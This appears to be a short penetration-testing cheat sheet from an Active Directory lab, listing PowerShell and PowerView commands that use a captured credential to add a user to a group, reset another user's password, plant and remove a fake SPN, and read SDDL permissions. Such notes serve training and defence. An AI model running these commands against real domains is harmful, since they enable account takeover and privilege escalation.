

Creating SecureString Object
```powershell-session
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```


Creating PSCredential Object
```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Add user to group ($cred defined above)
```powershell-session
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
```

Change User password with powerview
```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Creating fake SPN 
```powershell-session
Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Removing fake SPN
```powershell-session
Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
```

Removing Group membership
```powershell-session
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred -Verbose
```

Converting the SDDL String into a Readable Format
```powershell-session
ConvertFrom-SddlString "SDDL-String"
```
Filter discretionaryacl with sddl string conversion 
```powershell-session
ConvertFrom-SddlString "SDDL-String" | select -ExpandProperty DiscretionaryAcl
```